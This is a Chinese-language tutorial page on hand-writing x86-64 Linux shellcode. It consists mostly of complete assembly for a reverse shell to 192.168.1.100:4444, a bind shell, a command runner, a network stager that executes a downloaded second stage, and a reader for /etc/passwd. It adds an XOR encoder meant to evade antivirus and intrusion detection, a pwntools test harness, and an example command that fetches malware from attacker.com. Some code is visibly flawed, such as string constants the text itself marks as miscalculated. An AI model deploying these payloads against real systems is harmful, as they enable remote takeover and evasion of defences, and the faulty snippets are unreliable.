---
title: "案例四：Assembly Shellcode实战"
type: docs
weight: 4
---

## 案例四：Assembly Shellcode实战

Shellcode是漏洞利用的核心载荷——一段可以直接被CPU执行的机器码，通常以字节数组的形式注入到目标进程的内存空间中。本案例从零开始，手把手教你编写、分析、测试和优化x86-64 Linux Shellcode，涵盖反弹Shell、Bind Shell、执行命令等多种实战场景。

### 什么是Shellcode

Shellcode的名字来源于最早的用途：注入一段代码来获得一个shell（如`/bin/sh`）。如今它的含义已经泛化——任何能在目标进程中独立运行的机器码字节序列都可以称为Shellcode。

```text
Shellcode在攻击链中的位置：
┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│ 漏洞发现     │───▶│ 漏洞利用     │───▶│ Shellcode   │───▶│ 后渗透阶段   │
│ (发现缓冲区  │    │ (控制EIP/   │    │ (执行恶意   │    │ (提权/横向/  │
│  溢出等)     │    │  RIP)       │    │  操作)      │    │  持久化)     │
└─────────────┘    └─────────────┘    └─────────────┘    └─────────────┘
```

#### Shellcode vs 普通程序的关键区别

| 特性 | 普通程序 | Shellcode |
|------|----------|-----------|
| 地址引用 | 绝对地址（加载器重定位） | 必须使用相对地址或自定位 |
| 外部调用 | 通过PLT/GOT调用libc | 必须直接使用syscall指令 |
| 字符串存储 | .data/.rodata段 | 必须内嵌到代码段中 |
| 空字节 | 无限制 | **绝对不能包含\x00**（多数场景） |
| 体积 | 无限制 | 越小越好（受缓冲区大小限制） |
| 依赖 | libc等共享库 | 完全自包含 |
| 入口 | main函数 | `_start`或shellcode第一条指令 |

#### Shellcode的约束条件

在编写Shellcode之前，必须理解它面临的约束，这些约束直接决定了代码的写法：

**1. 零字节（Null Byte）约束**

这是最核心的约束。大多数漏洞场景中，Shellcode通过字符串函数（如`strcpy`、`sprintf`）注入，这些函数以`\x00`作为终止符。一旦Shellcode中出现零字节，后续内容会被截断。

```asm
; 错误写法 — mov指令会生成零字节
mov rax, 59          ; 编码为 48 C7 C0 3B 00 00 00 ← 三个零字节！

; 正确写法 — 使用xor+push+pop组合
xor rax, rax         ; 清零
push 59
pop rax              ; rax = 59，无零字节
```

**2. 空格/不可打印字符约束**

某些注入点（如URL参数、HTTP头、格式化字符串）只接受可打印字符（0x20-0x7E）。这类场景需要使用字母数字Shellcode（Alphanumeric Shellcode）或编码器。

**3. 体积约束**

溢出缓冲区的大小是有限的。如果Shellcode太长，会覆盖关键数据导致崩溃。典型的缓冲区大小限制从几十字节到几千字节不等。

**4. 字符集约束**

某些场景会过滤特定字符（如换行符`\x0a`、引号、反斜杠），Shellcode必须避免这些字节。

#### Syscall基础：Shellcode的唯一"系统调用"方式

Shellcode不能调用libc函数，必须直接使用`syscall`指令与内核交互。Linux x86-64的syscall约定：

```text
Linux x86-64 Syscall调用约定：
┌────────────┬──────────────┐
│ 参数位置    │ 寄存器        │
├────────────┼──────────────┤
│ syscall号  │ RAX          │
│ 第1个参数   │ RDI          │
│ 第2个参数   │ RSI          │
│ 第3个参数   │ RDX          │
│ 第4个参数   │ R10          │
│ 第5个参数   │ R8           │
│ 第6个参数   │ R9           │
│ 返回值      │ RAX          │
└────────────┴──────────────┘
```

常用的syscall号（可通过`/usr/include/asm/unistd_64.h`查看）：

| 功能 | syscall号 | 名称 | 原型 |
|------|-----------|------|------|
| 读取 | 0 | read | read(fd, buf, count) |
| 写入 | 1 | write | write(fd, buf, count) |
| 打开 | 2 | open | open(path, flags, mode) |
| 关闭 | 3 | close | close(fd) |
| socket | 41 | socket | socket(domain, type, protocol) |
| connect | 42 | connect | connect(fd, addr, addrlen) |
| bind | 49 | bind | bind(fd, addr, addrlen) |
| listen | 50 | listen | listen(fd, backlog) |
| accept | 43 | accept | accept(fd, addr, addrlen) |
| dup2 | 33 | dup2 | dup2(oldfd, newfd) |
| execve | 59 | execve | execve(path, argv, envp) |
| fork | 57 | fork | fork() |
| exit | 60 | exit | exit(code) |

### 实战一：反弹Shell Shellcode（Reverse Shell）

反弹Shell是最经典的Shellcode类型——目标机器主动连接攻击者，绕过入站防火墙限制。

#### 攻击原理

```text
攻击者 (192.168.1.100:4444)          目标机器
┌─────────────────────┐              ┌─────────────────────┐
│  nc -lvnp 4444      │◀─────────────│  Shellcode执行：     │
│                     │   TCP连接     │  1. 创建socket       │
│  等待连接...         │              │  2. connect到攻击者   │
│  收到shell!         │              │  3. dup2重定向IO     │
│  $ whoami           │─────────────▶│  4. execve /bin/sh  │
│  root               │   命令/输出   │                     │
└─────────────────────┘              └─────────────────────┘
```

#### 完整代码与逐行分析

```asm
; ============================================================
; Linux x86-64 反弹Shell Shellcode
; 连接到攻击者IP:PORT，重定向stdin/stdout/stderr，执行/bin/sh
; 编译: nasm -f elf64 reverse_shell.asm
; 链接: ld -o reverse_shell reverse_shell.o
; 提取: objdump -d reverse_shell | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/../\\x&/g'
; ============================================================

section .text
global _start

_start:
    ; ========================
    ; 第一步：创建Socket
    ; ========================
    ; socket(AF_INET=2, SOCK_STREAM=1, IPPROTO_IP=0)
    ; syscall号: 41

    xor    rsi, rsi        ; rsi = 0，同时作为清零操作
    push   rsi             ; protocol = IPPROTO_IP = 0 (入栈，rsp下移8字节)
    push   1               ; type = SOCK_STREAM = 1
    push   2               ; domain = AF_INET = 2
    mov    rdi, rsp         ; rdi = 指向栈上刚压入的参数数组 [2, 1, 0]
    push   41              ; syscall号 41 = __NR_socket
    pop    rax             ; rax = 41（避免mov生成零字节）
    syscall                ; 调用内核，返回值在rax中 = socket fd
    mov    r12, rax        ; 保存socket fd到r12（callee-saved寄存器，不会被syscall破坏）

    ; ========================
    ; 第二步：构建sockaddr_in结构并连接
    ; ========================
    ; connect(fd, &sockaddr_in, 16)
    ; sockaddr_in结构（16字节）:
    ;   +0: sa_family = AF_INET (2字节)
    ;   +2: sin_port = htons(4444) (2字节)
    ;   +4: sin_addr = 192.168.1.100 (4字节)
    ;   +8: sin_zero = 0 (8字节填充)

    ; 注意：以下写法需要根据实际IP/端口修改
    ; IP: 192.168.1.100 = 0xC0A80164
    ; Port: 4444 = 0x115C

    ; 先构建sockaddr_in在栈上
    xor    rsi, rsi        ; 清零，用作sin_zero填充
    push   rsi             ; sin_zero (8字节零填充)
    push   rsi             ; sin_zero的另一半

    ; 构造IP和端口（注意小端序）
    mov    dword [rsp-4], 0x6401A8C0   ; 192.168.1.100 → 小端序 64.01.A8.C0
    mov    word  [rsp-6], 0x5C11       ; 端口4444 → 小端序 5C.11 (htons(4444))
    mov    word  [rsp-8], 2            ; AF_INET = 2
    sub    rsp, 8           ; 调整rsp，使sockaddr_in结构完整位于栈上

    ; 调用connect
    mov    rdi, r12         ; rdi = socket fd
    mov    rsi, rsp         ; rsi = 指向sockaddr_in
    mov    rdx, 16          ; rdx = sizeof(sockaddr_in) = 16
    push   42              ; syscall号 42 = __NR_connect
    pop    rax
    syscall

    ; 检查connect是否成功（rax < 0表示错误）
    test   rax, rax
    js     _exit            ; 如果失败则退出

    ; ========================
    ; 第三步：重定向标准IO
    ; ========================
    ; dup2(oldfd, newfd) — 将socket fd复制到stdin(0), stdout(1), stderr(2)
    ; 这样后续execve的shell的所有IO都通过socket传输

    xor    rsi, rsi        ; rsi = 0（从stdin开始）
.dup_loop:
    mov    rdi, r12         ; rdi = socket fd（oldfd）
    push   33              ; syscall号 33 = __NR_dup2
    pop    rax
    syscall                ; dup2(socket_fd, rsi)
    inc    rsi             ; rsi++：0 → 1 → 2
    cmp    rsi, 3          ; 是否已完成stderr？
    jl     .dup_loop       ; 未完成则继续循环

    ; ========================
    ; 第四步：执行 /bin/sh
    ; ========================
    ; execve("/bin/sh", ["/bin/sh", NULL], NULL)
    ; syscall号: 59

    ; 构造字符串 "/bin/sh\0"（注意末尾的零字节是字符串终止符）
    ; "/bin/sh" 的十六进制: 2f 62 69 6e 2f 73 68
    ; 倒序组装为64位整数: 0x0068732f6e69622f（注意末尾的\00）

    xor    rsi, rsi        ; argv = NULL
    xor    rdx, rdx        ; envp = NULL
    mov    rax, 0x68732f6e69622f  ; "/bin/sh\0"（注意：mov到rax会包含前导零字节，但这是字符串终止符，不影响功能）
    push   rax             ; 将字符串压入栈
    mov    rdi, rsp         ; rdi = 指向栈上的"/bin/sh"
    push   59              ; syscall号 59 = __NR_execve
    pop    rax
    syscall                ; 执行！

_exit:
    ; 如果connect失败，优雅退出
    xor    rdi, rdi        ; exit code = 0
    push   60              ; syscall号 60 = __NR_exit
    pop    rax
    syscall
```

#### 关键技巧解析

**技巧1：避免零字节的寄存器清零**

```asm
; 以下三种方式等价，但生成的机器码不同：
mov rax, 0           ; 48 C7 C0 00 00 00 00 ← 有零字节！
xor eax, eax         ; 31 C0                 ← 无零字节，但只清低32位
xor rax, rax         ; 48 31 C0              ← 无零字节，清全部64位
```

`xor rax, rax`是标准清零方式：CPU保证`xor reg, reg`的结果全零，同时会自动零扩展到64位（x86-64规则：写32位寄存器时高位自动清零）。

**技巧2：用push/pop代替mov加载小值**

```asm
; mov rax, 59 → 48 C7 C0 3B 00 00 00 ← 三个零字节
; 替代方案：
push 59              ; 6A 3B               ← 只有2字节，无零
pop rax              ; 58                  ← 只有1字节
; 总共3字节 vs 7字节，且无零字节
```

**技巧3：字符串构造——Hex编码倒序组装**

`/bin/sh`不能直接放在代码中（ELF格式的`.text`段不直接存储字符串），需要手动构造：

```text
/bin/sh 的字节:  2f  62  69  6e  2f  73  68  00
                   ↓ 倒序组装为64位整数
0x0068732f6e69622f
```

**技巧4：利用栈传递参数**

syscall需要多个参数，最高效的方式是将参数压栈，然后让寄存器指向栈：

```asm
push rsi            ; protocol = 0
push 1              ; type = SOCK_STREAM
push 2              ; domain = AF_INET
mov rdi, rsp        ; rdi指向栈上的参数数组
```

**技巧5：保存关键值到callee-saved寄存器**

`r12-r15`是callee-saved寄存器，syscall不会修改它们。将socket fd保存到`r12`，后续可安全使用。

#### 编译与提取

```bash
# 1. 编写汇编源码（reverse_shell.asm）
# 2. 汇编
nasm -f elf64 reverse_shell.asm -o reverse_shell.o

# 3. 链接
ld -o reverse_shell reverse_shell.o

# 4. 反汇编验证
objdump -d reverse_shell

# 5. 提取原始字节码
objdump -d reverse_shell | grep '[0-9a-f]:' | \
  grep -v 'file' | cut -f2 | tr -d ' ' | tr -d '\n' | \
  sed 's/../\\x&/g'

# 6. 或者用更简洁的方式
for i in $(objdump -d reverse_shell | grep "^ " | cut -f2); do
  echo -n "\x$i"
done

# 7. 查看最终Shellcode长度
objdump -d reverse_shell | grep -c '[0-9a-f]:'
```

### 实战二：Bind Shell Shellcode

Bind Shell在目标机器上监听端口，等待攻击者连接。适用于目标机器有公网IP或在同一内网中。

#### 与反弹Shell的区别

```text
反弹Shell (Reverse Shell):
  攻击者 ──监听──▶ 目标主动连接 ──▶ 获得shell
  优点：绕过入站防火墙
  缺点：攻击者需要有可达的IP

Bind Shell:
  目标 ──监听某端口──▶ 攻击者连接 ──▶ 获得shell
  优点：攻击者不需要公网IP
  缺点：需要目标端口可访问
```

#### Bind Shell代码

```asm
; ============================================================
; Linux x86-64 Bind Shell Shellcode
; 在目标机器监听端口4444，等待连接后执行/bin/sh
; ============================================================

section .text
global _start

_start:
    ; === 创建socket ===
    xor    rsi, rsi
    push   rsi             ; protocol = 0
    push   1               ; SOCK_STREAM
    push   2               ; AF_INET
    mov    rdi, rsp
    push   41
    pop    rax
    syscall
    mov    r12, rax        ; 保存socket fd

    ; === bind(fd, &addr, 16) ===
    ; 构造sockaddr_in: AF_INET, port 4444, INADDR_ANY(0.0.0.0)
    xor    rsi, rsi
    push   rsi             ; sin_zero填充
    push   rsi
    mov    dword [rsp-4], 0x00000000   ; INADDR_ANY = 0.0.0.0
    mov    word  [rsp-6], 0x5C11       ; port 4444 (小端序)
    mov    word  [rsp-8], 2            ; AF_INET
    sub    rsp, 8

    mov    rdi, r12         ; socket fd
    mov    rsi, rsp         ; sockaddr_in指针
    mov    rdx, 16          ; sizeof(sockaddr_in)
    push   49              ; syscall 49 = bind
    pop    rax
    syscall

    ; === listen(fd, 1) ===
    mov    rdi, r12         ; socket fd
    xor    rsi, rsi
    inc    rsi             ; backlog = 1
    push   50              ; syscall 50 = listen
    pop    rax
    syscall

    ; === accept(fd, NULL, NULL) ===
    mov    rdi, r12         ; socket fd
    xor    rsi, rsi         ; addr = NULL
    xor    rdx, rdx         ; addrlen = NULL
    push   43              ; syscall 43 = accept
    pop    rax
    syscall
    mov    r13, rax        ; 保存新的连接fd

    ; === dup2重定向IO ===
    xor    rsi, rsi
.dup_loop:
    mov    rdi, r13         ; 连接fd
    push   33
    pop    rax
    syscall
    inc    rsi
    cmp    rsi, 3
    jl     .dup_loop

    ; === execve("/bin/sh", ...) ===
    xor    rsi, rsi
    xor    rdx, rdx
    mov    rax, 0x68732f6e69622f
    push   rax
    mov    rdi, rsp
    push   59
    pop    rax
    syscall
```

### 实战三：执行任意命令的Shellcode

有时不需要交互式shell，只需执行一条特定命令（如创建文件、下载工具、添加用户）。这种Shellcode更短、更隐蔽。

#### 方案一：execve直接执行命令

```asm
; ============================================================
; 执行单条命令的Shellcode
; 以执行 "touch /tmp/pwned" 为例
; ============================================================

section .text
global _start

_start:
    ; execve("/bin/sh", ["/bin/sh", "-c", "touch /tmp/pwned", NULL], NULL)

    ; 构造字符串 "/bin/sh" 在栈上
    xor    rax, rax
    push   rax             ; 字符串终止符 \0
    mov    rax, 0x68732f6e69622f  ; "/bin/sh"
    push   rax
    mov    r15, rsp        ; r15 = "/bin/sh" 的地址

    ; 构造字符串 "-c"
    xor    rax, rax
    push   rax
    push   0x632d          ; "-c\0\0"
    mov    r14, rsp        ; r14 = "-c" 的地址

    ; 构造命令字符串 "touch /tmp/pwned"
    ; 注意：不能直接push整个字符串（长度不是8的倍数）
    ; 使用逐字节压栈方式
    xor    rax, rax
    push   rax             ; 终止符

    ; "touch /tmp/pwned" = 74 6f 75 63 68 20 2f 74 6d 70 2f 70 77 6e 65 64
    ; 分两段push（每段8字节，注意小端序）
    mov    rax, 0x702f706d742f2068  ; "h /tmp/p\0" 不对，重新计算
    ; 实际上需要更仔细地构造：
    ; "touch /tmp/pwned\0"
    ; 长度17字节，补到24字节（3个8字节push）
    ; 倒序排列：\0 de wn p/ pm t/ h c uo c t
    ;          = 00 64 65 77 70 2f 70 6d 74 2f 20 68 63 75 6f 63 74

    ; 简化方案：先push零终止符，再分段push
    ; 用更小的命令 "id" 来演示原理
    xor    rax, rax
    push   rax             ; \0 终止符
    push   0x6469          ; "id\0\0"
    mov    r13, rsp        ; r13 = "id" 的地址

    ; 构造 argv 数组: ["/bin/sh", "-c", "id", NULL]
    xor    rax, rax
    push   rax             ; argv[3] = NULL
    push   r13             ; argv[2] = "id"
    push   r14             ; argv[1] = "-c"
    push   r15             ; argv[0] = "/bin/sh"
    mov    rsi, rsp        ; rsi = argv 指针

    ; execve
    mov    rdi, r15        ; path = "/bin/sh"
    xor    rdx, rdx        ; envp = NULL
    push   59
    pop    rax
    syscall
```

#### 方案二：利用栈布局一次构造长命令

对于更长的命令字符串，使用循环逐字节写入更高效：

```asm
; 构造任意长度字符串的通用模板
; 假设要构造 "wget http://attacker.com/malware -O /tmp/m"

    ; 方法：在栈上预留空间，用mov byte逐字节填入
    sub    rsp, 64          ; 在栈上预留64字节缓冲区
    mov    rdi, rsp         ; rdi = 缓冲区起始地址

    ; 逐字节写入（编译器不会生成零字节，因为每个mov byte都是独立指令）
    mov    byte [rdi],    'w'
    mov    byte [rdi+1],  'g'
    mov    byte [rdi+2],  'e'
    mov    byte [rdi+3],  't'
    mov    byte [rdi+4],  ' '
    ; ... 继续填入剩余字符 ...
    mov    byte [rdi+N],  0    ; 字符串终止符

    ; 注意：如果命令中某个字符正好是\x00，这种方法同样会被截断
    ; 解决方案：使用异或编码，运行时解码
```

### 实战四：Stage Shellcode（分阶段加载）

当缓冲区太小放不下完整Shellcode时，使用分阶段加载：第一阶段（Stager）很小，负责接收第二阶段（Stage）的完整载荷到内存中。

#### 分阶段架构

```text
第一阶段 (Stager, ~50字节):
┌─────────────────────────────┐
│ 1. 创建socket               │
│ 2. connect到攻击者           │
│ 3. 接收第二阶段到内存        │
│ 4. 跳转到第二阶段执行        │
└─────────────────────────────┘
              │
              ▼ 接收并执行
第二阶段 (Stage, 可达数KB):
┌─────────────────────────────┐
│ 完整的reverse shell          │
│ 或其他复杂功能               │
│ 不受缓冲区大小限制           │
└─────────────────────────────┘
```

#### Stager代码（接收端）

```asm
; ============================================================
; x86-64 Reverse TCP Stager
; 连接到攻击者并接收第二阶段载荷到内存，然后跳转执行
; 适用于pwntools的 reverse_tcp payload
; ============================================================

section .text
global _start

_start:
    ; 创建socket
    xor    rsi, rsi
    push   rsi
    push   1
    push   2
    mov    rdi, rsp
    push   41
    pop    rax
    syscall
    mov    r12, rax        ; socket fd

    ; connect到攻击者
    xor    rsi, rsi
    push   rsi
    push   rsi
    mov    dword [rsp-4], 0x6401A8C0   ; IP: 192.168.1.100
    mov    word  [rsp-6], 0x5C11       ; Port: 4444
    mov    word  [rsp-8], 2
    sub    rsp, 8
    mov    rdi, r12
    mov    rsi, rsp
    mov    rdx, 16
    push   42
    pop    rax
    syscall

    ; mmap分配可执行内存（RWX）
    xor    rdi, rdi         ; addr = NULL（让内核选择）
    mov    rsi, 0x1000      ; size = 4096
    mov    rdx, 7           ; prot = PROT_READ|PROT_WRITE|PROT_EXEC
    mov    r10, 0x22        ; flags = MAP_PRIVATE|MAP_ANONYMOUS
    xor    r8, r8           ; fd = -1 (MAP_ANONYMOUS)
    dec    r8
    xor    r9, r9           ; offset = 0
    push   9                ; syscall 9 = mmap
    pop    rax
    syscall
    mov    r13, rax         ; 保存mmap地址

    ; 通过socket接收Stage到mmap内存
    mov    rdi, r12         ; socket fd
    mov    rsi, r13         ; buffer = mmap地址
    mov    rdx, 0x1000      ; 接收最多4096字节
    xor    r10, r10         ; flags = 0
    push   45               ; syscall 45 = recvfrom (或 0=read)
    pop    rax
    syscall

    ; 跳转到Stage执行
    jmp    r13              ; 跳转到mmap内存中的Stage代码
```

### Shellcode编码与混淆

原始Shellcode往往会被IDS/IPS/AV检测到。编码是绕过检测的基本手段。

#### 常见编码方案对比

| 编码方式 | 复杂度 | 体积膨胀 | 绕过效果 | 适用场景 |
|----------|--------|----------|----------|----------|
| XOR编码 | 低 | ~10% | 中等 | 最通用 |
| Base64+解码器 | 中 | ~33% | 低（已被广泛检测） | 可打印字符场景 |
| Shikata-Ga-Nai (多态) | 高 | ~20-40% | 高 | 渗透测试 |
| 字母数字编码 | 高 | ~200%+ | 高 | 受限字符集场景 |
| 自定义加密 | 中 | ~15% | 高（取决于密钥） | 定制化需求 |

#### XOR编码实现

```asm
; ============================================================
; XOR编码Shellcode解码器（自修改代码）
; 将编码后的Shellcode在运行时解码并执行
; ============================================================

section .text
global _start

_start:
    jmp    get_encoded_addr    ; JMP-CALL-POP技巧获取地址

decode:
    pop    rsi                 ; rsi = 编码后Shellcode的地址
    mov    rdi, rsi            ; 保存起始地址
    mov    rcx, SHELLCODE_LEN  ; Shellcode长度

.decode_loop:
    xor    byte [rsi], XOR_KEY ; 用XOR密钥逐字节解码
    inc    rsi
    dec    rcx
    jnz    .decode_loop

    jmp    rdi                 ; 跳转到已解码的Shellcode执行

get_encoded_addr:
    call   decode              ; CALL指令将下一条指令地址压栈
    ; 编码后的Shellcode紧跟在CALL指令后面
    encoded_shellcode: db 0x48,0x31,0xC0,0x50,...  ; XOR编码后的字节

SHELLCODE_LEN equ encoded_shellcode_end - encoded_shellcode
XOR_KEY       equ 0xAA       ; XOR密钥（可以是任意值）
```

**XOR编码Python脚本**：

```python
#!/usr/bin/env python3
"""Shellcode XOR编码器 — 生成无零字节的编码后Shellcode"""

def xor_encode(shellcode: bytes, key: int = 0xAA) -> bytes:
    """用单字节XOR密钥编码Shellcode"""
    return bytes(b ^ key for b in shellcode)

def find_null_free_key(shellcode: bytes) -> int:
    """自动找到一个使编码后无零字节的XOR密钥"""
    for key in range(1, 256):
        encoded = xor_encode(shellcode, key)
        if 0x00 not in encoded:
            return key
    raise ValueError("无法找到无零字节的XOR密钥")

# 原始Shellcode（从nasm编译后提取）
raw_shellcode = (
    b"\x48\x31\xf6\x56\x6a\x01\x6a\x02\x48\x89\xe7"
    b"\x6a\x29\x58\x0f\x05\x49\x89\xc4"
    # ... 更多字节
)

# 编码
key = find_null_free_key(raw_shellcode)
encoded = xor_encode(raw_shellcode, key)

print(f"XOR密钥: 0x{key:02x}")
print(f"原始长度: {len(raw_shellcode)} 字节")
print(f"编码后长度: {len(encoded)} 字节")
print(f"编码后无零字节: {0x00 not in encoded}")

# 输出为nasm db格式
chunks = [encoded[i:i+16] for i in range(0, len(encoded), 16)]
for chunk in chunks:
    hex_vals = ','.join(f'0x{b:02x}' for b in chunk)
    print(f"db {hex_vals}")
```

### Shellcode测试框架

#### 完整的pwntools测试流程

```python
#!/usr/bin/env python3
"""
Shellcode测试框架 — 完整的测试、调试、验证流程
依赖: pip install pwntools
"""

from pwn import *
import sys
import os

context.arch = 'amd64'
context.log_level = 'info'

# ========================
# 1. 加载Shellcode
# ========================

def load_shellcode(source: str) -> bytes:
    """从多种格式加载Shellcode"""
    if os.path.isfile(source):
        # 从文件加载（支持.bin原始格式和.py的Python格式）
        if source.endswith('.py'):
            # 从Python文件提取shellcode变量
            ns = {}
            exec(open(source).read(), ns)
            return ns.get('shellcode', ns.get('sc', b''))
        else:
            return open(source, 'rb').read()
    elif '\\x' in source:
        # 从\x转义字符串解析
        return source.encode('latin-1').decode('unicode_escape').encode('latin-1')
    else:
        # 从hex字符串解析
        return bytes.fromhex(source)

# ========================
# 2. Shellcode验证
# ========================

def validate_shellcode(shellcode: bytes) -> dict:
    """验证Shellcode的合法性和质量"""
    results = {
        'length': len(shellcode),
        'null_free': 0x00 not in shellcode,
        'null_positions': [i for i, b in enumerate(shellcode) if b == 0x00],
        'bad_chars': {},
        'printable_ratio': sum(1 for b in shellcode if 0x20 <= b <= 0x7e) / len(shellcode) if shellcode else 0,
    }

    # 检查常见的bad characters
    bad_chars_list = [0x0a, 0x0d, 0x20, 0x09, 0x0b, 0x0c]
    for bc in bad_chars_list:
        positions = [i for i, b in enumerate(shellcode) if b == bc]
        if positions:
            results['bad_chars'][f'0x{bc:02x}'] = positions

    return results

def print_validation(shellcode: bytes):
    """打印验证报告"""
    v = validate_shellcode(shellcode)

    print(f"┌{'─'*40}┐")
    print(f"│ Shellcode验证报告{' '*22}│")
    print(f"├{'─'*40}┤")
    print(f"│ 长度:     {v['length']} 字节{' '*(27-len(str(v['length'])))}│")

    status = "✓ 无零字节" if v['null_free'] else f"✗ 零字节位置: {v['null_positions']}"
    print(f"│ 零字节:   {status}{' '*(27-len(status))}│")

    status = "✓" if not v['bad_chars'] else f"✗ 发现 {len(v['bad_chars'])} 种"
    print(f"│ Bad chars: {status}{' '*(27-len(status))}│")

    print(f"│ 可打印率: {v['printable_ratio']:.1%}{' '*25}│")
    print(f"└{'─'*40}┘")

    if v['bad_chars']:
        print("\nBad characters详情:")
        for char, positions in v['bad_chars'].items():
            print(f"  {char}: 位置 {positions[:5]}{'...' if len(positions) > 5 else ''}")

# ========================
# 3. 本地执行测试
# ========================

def test_local(shellcode: bytes):
    """在本地进程中测试Shellcode"""
    print("\n[*] 本地执行测试...")

    # 创建临时ELF执行Shellcode
    elf = asm(shellcode)
    p = process('/dev/stdin', shellcode=shellcode)

    # 等待短暂时间检查是否崩溃
    try:
        p.poll(block=True, timeout=2)
        if p.returncode is not None and p.returncode != 0:
            print(f"[!] Shellcode进程异常退出，返回码: {p.returncode}")
            return False
    except:
        pass  # 进程仍在运行，这是好事

    print("[+] Shellcode本地执行成功")
    p.close()
    return True

# ========================
# 4. 远程测试（配合监听器）
# ========================

def test_reverse_shell(shellcode: bytes, lhost: str = '127.0.0.1', lport: int = 4444):
    """测试反弹Shell类型的Shellcode"""
    print(f"\n[*] 反弹Shell测试 (连接到 {lhost}:{lport})...")

    # 启动监听器
    listener = listen(lport)

    # 在后台执行Shellcode
    p = process('/dev/stdin', shellcode=shellcode)

    # 等待连接
    try:
        conn = listener.wait_for_connection(timeout=10)
        print("[+] 收到反弹连接!")

        # 测试交互
        conn.sendline(b'whoami')
        result = conn.recvline(timeout=5).decode().strip()
        print(f"[+] whoami: {result}")

        conn.sendline(b'id')
        result = conn.recvline(timeout=5).decode().strip()
        print(f"[+] id: {result}")

        conn.sendline(b'hostname')
        result = conn.recvline(timeout=5).decode().strip()
        print(f"[+] hostname: {result}")

        conn.close()
        print("[+] 反弹Shell测试完成")
        return True

    except Exception as e:
        print(f"[!] 测试失败: {e}")
        return False
    finally:
        p.close()
        listener.close()

# ========================
# 5. GDB调试辅助
# ========================

def debug_shellcode(shellcode: bytes):
    """在GDB中调试Shellcode"""
    print("\n[*] 生成调试ELF...")

    # 创建一个包含Shellcode的ELF文件
    elf_path = '/tmp/shellcode_debug'
    asm_code = asm(shellcode)

    # 写入ELF
    ELF.from_bytes(asm_code).save(elf_path)
    os.chmod(elf_path, 0o755)

    print(f"[+] ELF已保存到: {elf_path}")
    print(f"[*] 使用以下命令调试:")
    print(f"    gdb -q {elf_path}")
    print(f"    (gdb) set disassembly-flavor intel")
    print(f"    (gdb) break *(&_start)")
    print(f"    (gdb) run")
    print(f"    (gdb) x/20i $rip")

# ========================
# 主程序
# ========================

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <shellcode_file|hex_string> [--test] [--debug]")
        sys.exit(1)

    source = sys.argv[1]
    shellcode = load_shellcode(source)

    print(f"[*] 加载了 {len(shellcode)} 字节Shellcode")
    print_validation(shellcode)

    if '--test' in sys.argv:
        test_local(shellcode)
        if '--reverse' in sys.argv:
            test_reverse_shell(shellcode)

    if '--debug' in sys.argv:
        debug_shellcode(shellcode)
```

#### 使用LLDB调试Shellcode（macOS/Linux）

```bash
# 将Shellcode写入可执行内存并单步调试
# 方法1：使用shellcode_launcher.c

cat > /tmp/launcher.c << 'EOF'
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

int main() {
    // Shellcode字节
    unsigned char shellcode[] = {
        0x48, 0x31, 0xf6, 0x56, 0x6a, 0x01, 0x6a, 0x02,
        // ... 替换为实际Shellcode
    };

    // 分配可执行内存
    void *mem = mmap(NULL, sizeof(shellcode),
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    // 复制Shellcode到可执行内存
    memcpy(mem, shellcode, sizeof(shellcode));

    printf("Shellcode at: %p\n", mem);
    printf("Press Enter to execute...\n");
    getchar();

    // 跳转执行
    ((void(*)())mem)();

    return 0;
}
EOF

# 编译
gcc -o /tmp/launcher /tmp/launcher.c -z execstack

# 用GDB调试
gdb -q /tmp/launcher
(gdb) break main
(gdb) run
(gdb) # 在mmap后设置断点，查看shellcode地址
(gdb) x/20bx <shellcode地址>
(gdb) # 单步执行
(gdb) stepi
(gdb) info registers
```

### 实战五：文件操作Shellcode

Shellcode不仅能执行命令，还能直接操作文件——读取敏感文件、写入后门、修改配置。

#### 读取/etc/passwd

```asm
; ============================================================
; 读取 /etc/passwd 并通过socket发送
; 适用于有文件读取漏洞但需要直接读取的场景
; ============================================================

section .text
global _start

_start:
    ; === 打开文件 ===
    ; open("/etc/passwd", O_RDONLY=0)

    ; 构造字符串 "/etc/passwd"
    xor    rax, rax
    push   rax             ; \0 终止符
    mov    rax, 0x6477737361702f63  ; "c/passwd"
    push   rax
    mov    rax, 0x74652f2f2f2f2f2f  ; "/////te"  ← 实际是 "/etc//"
    push   rax
    ; 调整指针指向正确的 "/etc/passwd" 开头
    ; 栈上现在是: ["/etc/passwd\0"]
    lea    rdi, [rsp+5]    ; 跳过多余的斜杠，指向正确位置

    xor    rsi, rsi         ; O_RDONLY = 0
    xor    rdx, rdx         ; mode = 0
    push   2               ; syscall 2 = open
    pop    rax
    syscall
    mov    r12, rax         ; 保存文件fd

    ; === 读取文件内容到栈上 ===
    sub    rsp, 4096        ; 在栈上分配4096字节缓冲区
    mov    rdi, r12         ; 文件fd
    mov    rsi, rsp         ; 缓冲区地址
    mov    rdx, 4096        ; 读取字节数
    push   0               ; syscall 0 = read
    pop    rax
    syscall
    mov    r13, rax         ; 保存实际读取的字节数

    ; === 关闭文件 ===
    mov    rdi, r12
    push   3               ; syscall 3 = close
    pop    rax
    syscall

    ; === 将内容写入stdout ===
    mov    rdi, 1           ; stdout
    mov    rsi, rsp         ; 缓冲区
    mov    rdx, r13         ; 读取的字节数
    push   1               ; syscall 1 = write
    pop    rax
    syscall

    ; === 退出 ===
    xor    rdi, rdi
    push   60
    pop    rax
    syscall
```

#### Shellcode字符串构造对比表

| 方法 | 优点 | 缺点 | 零字节 |
|------|------|------|--------|
| 直接mov立即数 | 简单直观 | 长度受限（最大8字节） | 可能有 |
| push多段 | 无长度限制 | 需要精确计算小端序 | 需避免 |
| 逐字节mov byte | 精确控制每个字节 | 代码量大 | 可控制 |
| 运行时解码(XOR) | 可完全避免零字节 | 需要额外解码逻辑 | 无 |
| JMP-CALL-POP获取地址 | 经典技巧 | x86-64中不常用 | 视情况 |

### 防御视角：Shellcode检测与防护

了解防御手段有助于理解Shellcode的局限性和绕过思路。

#### 操作系统级防护

```text
现代Linux内核的Shellcode防护：
┌────────────────────┬────────────────────────────────────────┐
│ 防护机制            │ 作用                                   │
├────────────────────┼────────────────────────────────────────┤
│ NX/DEP             │ 标记数据页不可执行，阻止栈上Shellcode    │
│ ASLR               │ 随机化内存布局，使地址预测困难           │
